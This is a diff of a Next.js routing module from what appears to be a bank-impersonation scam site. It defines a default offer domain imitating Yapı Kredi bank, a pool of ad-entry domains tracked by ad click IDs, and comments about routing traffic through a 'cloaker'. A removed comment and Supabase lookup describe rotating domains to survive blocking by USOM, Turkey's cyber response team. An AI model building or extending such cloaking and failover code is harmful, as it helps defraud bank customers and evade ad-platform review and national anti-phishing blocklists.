@@ -1,11 +1,10 @@
 import type { NextRequest } from "next/server";
-import { getCachedActiveHostname, getCachedOfferHostname } from "@/lib/domains/active-cache";
-import { isFailoverExcluded } from "@/lib/domains/failover";
+import { getCachedOfferHostname } from "@/lib/domains/active-cache";
 import { OFFER_PASS_PARAM, verifyOfferPassToken } from "@/lib/offer-pass";
 
 const DEFAULT_OFFER_HOST = "yapikredi.online";
 
-/** Yedek reklam domainleri — aynı anda yalnızca biri aktif (CRM + USOM failover) */
+/** Reklam giriş domainleri — her biri kendi hostunda cloaker'dan geçer. */
 const AD_POOL_HOSTS = ["kredifirsatlari.org", "ekonomikbakis.org"];
 
 const AD_CLICK_PARAMS = ["fbclid", "gclid", "ttclid", "twclid", "msclkid"];
@@ -74,37 +73,6 @@ export async function isOfferHost(host: string | null): Promise<boolean> {
   return normalized === (await getOfferHost());
 }
 
-/** Edge middleware uyumlu: Supabase REST'ten aktif reklam domaini oku. */
-async function getActiveAdHostFromSupabase(): Promise<string | null> {
-  const url = process.env.SUPABASE_URL?.trim();
-  const key = process.env.SUPABASE_SERVICE_ROLE_KEY?.trim();
-  if (!url || !key) return null;
-
-  try {
-    const res = await fetch(
-      `${url.replace(/\/$/, "")}/rest/v1/site_domains?select=hostname,status&status=eq.active&limit=1`,
-      {
-        headers: {
-          apikey: key,
-          Authorization: `Bearer ${key}`,
-        },
-        cache: "no-store",
-      }
-    );
-    if (!res.ok) return null;
-    const rows = (await res.json()) as Array<{ hostname?: string; status?: string }>;
-    const hostname = normalizeHostname(rows[0]?.hostname ?? null);
-    return hostname && isAdPoolHost(hostname) ? hostname : null;
-  } catch {
-    return null;
-  }
-}
-
-/** Aktif reklam domaini: önce Supabase, fallback ENTRY_HOSTS ilk domain */
-export async function getActiveAdHost(): Promise<string | null> {
-  return (await getActiveAdHostFromSupabase()) ?? getAdPoolHosts()[0] ?? null;
-}
-
 export async function isEntryHost(host: string | null): Promise<boolean> {
   return isAdPoolHost(host);
 }
@@ -166,10 +134,3 @@ export async function buildOfferHostUrl(request: NextRequest): Promise<URL> {
   return target;
 }
 
-export async function buildActiveAdUrl(request: NextRequest): Promise<URL> {
-  const active = await getActiveAdHost();
-  const target = request.nextUrl.clone();
-  target.protocol = "https:";
-  target.hostname = active ?? request.nextUrl.hostname;
-  return target;
-}
